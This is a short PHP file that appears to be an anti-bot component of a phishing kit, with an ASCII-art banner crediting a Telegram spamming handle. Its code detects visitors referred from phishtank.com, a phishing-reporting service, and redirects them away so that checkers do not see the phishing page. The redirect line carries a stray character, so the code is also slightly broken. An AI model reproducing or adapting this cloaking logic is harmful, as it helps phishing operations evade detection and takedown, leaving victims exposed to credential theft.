<?php
/*  
````````````````````````````````````````````````````````````````````````````````
``````````````````````````````````CODER INFO````````````````````````````````````
````````````````````````````````````````````````````````````````````````````````
``````````````````````````TELEGRAM: @ADVANCEDSPAMMING```````````````````````````
````````````````````````````````````````````````````````````````````````````````
````````````````````````````````.-/+osyyyso+/-.`````````````````````````````````
``````````````````````````````:oyhhhhhhhhhhhhhyo:```````````````````````````````
````````````````````````````/yhhhhhhhhhhhhhhhhhhhy/`````````````````````````````
``````````````````````````.shhhhhhhhhhhhhhhhhhhhhhhs.```````````````````````````
`````````````````````````.yhhhhhhhhhhhhhhhhhhhhhhhhhy.``````````````````````````
`````````````````````````shhhhhhhhhhhhhhhhhhhhhhhhhhhs``````````````````````````
``````````````````+++++`-hhhhhhhhhhhhhhhhhhhhhhhhhhhhh-`+++++```````````````````
`````````````````.hhhhh`/hhhhhhhhhhhhhhhhhhhhhhhhhhhhh+`hhhhh.``````````````````
`````````````````.hhhy+`/hhhhhhhhhhhhhhhhhhhhhhhhhhhhh/`+yhhh.``````````````````
`````````````````.hhh+``.hhhhhhyo++shhhhhhhs++oshhhhhh-``+hhh.``````````````````
`````````````````.hhh+```+hhhy.`````/hhhhh+`````.shhho```+hhh.``````````````````
`````````````````.hhh+```.hhho``````/hhhhho``````/hhh.```+hhh.``````````````````
`````````````````.hhh+````hhhho::/+shhh+hhhyo/::ohhhh````+hhh.``````````````````
`````````````````.hhh+```+hhhhhhhhhhhh+`/hhhhhhhhhhhh+```+hhh.``````````````````
`````````````````.hhh+```-shhhhhhhhhhs```ohhhhhhhhhhs-```+hhh.``````````````````
`````````````````.hhh+`````-ohhyhhhhhhhhhhhhhhhyhho-`````+hhh.``````````````````
`````````````````.hhh+``````````.yhhhhhhhhhhhy.``````````+hhh.``````````````````
`````````````````.hhh+```````````ohhhhhhhhhhho```````````+hhh.``````````````````
`````````````````.hhh+```````````+yhhhhhhhhhy+```````````+hhh.``````````````````
`````````````````.hhh+````````````....---....````````````+hhh.``````````````````
`````````````````.hhhyoooooooooooooooooooooooooooooooooooyhhh.``````````````````
`````````````````.yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy.``````````````````
```````````.::::::///////////////.............///////////////::::::.````````````
```````````:hhhhhhhhhhhhhhhhhhhhho///////////ohhhhhhhhhhhhhhhhhhhhh/````````````
````````````/yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy/`````````````
`````````````.....................................................``````````````
````````````````````````````````````````````````````````````````````````````````
*/
if( isset( $_SERVER['HTTP_REFERER'] ) ) {
    if ( parse_url ($_SERVER['HTTP_REFERER'], PHP_URL_HOST ) == 'phishtank.com'  || parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'www.phishtank.com' ) {
        header( "HTTP/1.1 301 Moved Permanently" );
        header( "location: e" . $antibot['redirect_url'] ); 
        exit();
   }
}


?>